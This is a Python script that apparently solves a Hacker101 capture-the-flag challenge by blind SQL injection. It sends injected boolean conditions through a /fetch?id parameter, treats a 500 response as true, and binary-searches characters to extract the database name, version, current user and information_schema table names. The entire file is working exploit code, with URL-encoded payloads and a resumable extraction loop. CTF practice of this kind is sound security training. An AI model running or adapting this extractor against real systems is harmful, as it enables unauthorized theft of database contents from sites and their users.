#!/usr/bin/env python3
"""Blind SQLi extractor, Magical Image Gallery.

ORACLE (row 3, filename test.jpg which never fetches):
  /fetch?id=3 AND <cond>
    cond TRUE  -> row selected -> tries to fetch test.jpg -> 500
    cond FALSE -> no row       -> 404
  So: code == 500 means TRUE.

Everything below is fully URL-encoded and builds on this oracle.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"
PROG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ctf_progress2.json")
SLEEP = 0.22
TIMEOUT = 10


def load():
    if os.path.exists(PROG):
        try:
            with open(PROG) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save(data):
    with open(PROG, "w") as f:
        json.dump(data, f, indent=1)


def http(frag):
    """frag is already URL-encoded; returns status of /fetch?id=3+AND+<frag>."""
    url = f"{BASE}/fetch?id=3+AND+{frag}"
    for attempt in range(4):
        try:
            with urllib.request.urlopen(url, timeout=TIMEOUT) as r:
                return r.getcode()
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            time.sleep(1.2)
    return 0


def T(cond):
    c = http(cond)
    return c == 500


def q(s):
    """URL-encode for a query value context."""
    out = []
    for ch in s:
        if ch.isalnum() or ch in "._-":
            out.append(ch)
        else:
            out.append("%%%02X" % ord(ch))
    return "".join(out)


def extract_str(label, expr, maxlen=100):
    prog = load()
    key = f"str_{label}"
    if prog.get(key, {}).get("done"):
        print(f"[cached] {label} = {prog[key]['value']!r}")
        return prog[key]["value"]

    val = prog.get(key, {}).get("value", "")
    start = len(val) + 1 if val else 1
    for i in range(start, maxlen + 1):
        # is position i present?
        if not T(f"LENGTH({expr})%3E%3D{i}"):
            prog.setdefault(key, {})["value"] = val
            prog[key]["done"] = True
            save(prog)
            print(f"[done] {label} = {val!r}")
            return val
        lo, hi = 32, 127
        while lo < hi:
            time.sleep(SLEEP)
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING({expr}%2C{i}%2C1))%3E%3D{mid}"
            if T(cond):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo - 1)
        val += ch
        prog.setdefault(key, {})["value"] = val
        save(prog)
        print(f"[{label}] {i}: {ch!r} -> {val!r}", flush=True)
    return val


def main():
    what = sys.argv[1] if len(sys.argv) > 1 else "db"
    if what == "db":
        extract_str("db", "database()")
    elif what == "version":
        extract_str("version", "version()", 60)
    elif what == "cur_user":
        extract_str("cur_user", "current_user()", 40)
    elif what == "tables":
        extract_str("tables", "group_concat(table_name)", 500)
    elif what == "tables_all":
        extract_str("tables_all",
                    "(SELECT+group_concat(table_schema||'.'||table_name)+FROM+information_schema.tables)",
                    800)
    else:
        print("unknown:", what)


if __name__ == "__main__":
    main()